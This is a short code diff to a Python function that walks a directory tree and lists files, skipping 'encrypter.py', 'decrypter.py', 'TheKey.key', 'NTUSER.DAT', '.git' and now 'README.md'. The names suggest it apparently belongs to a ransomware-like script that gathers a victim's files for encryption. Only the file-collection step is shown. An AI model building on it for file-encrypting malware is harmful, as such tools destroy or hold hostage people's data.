@@ -37,7 +37,7 @@ def get_all_files(root_dir):
 
         for filename in filenames:
             full_path = os.path.join(dirpath, filename)
-            if full_path.endswith(("decrypter.py", "encrypter.py", "TheKey.key", "NTUSER.DAT", ".git")):
+            if full_path.endswith(("decrypter.py", "encrypter.py", "TheKey.key", "NTUSER.DAT", ".git", "README.md")):
                 continue
             all_files.append(full_path)
     return all_files
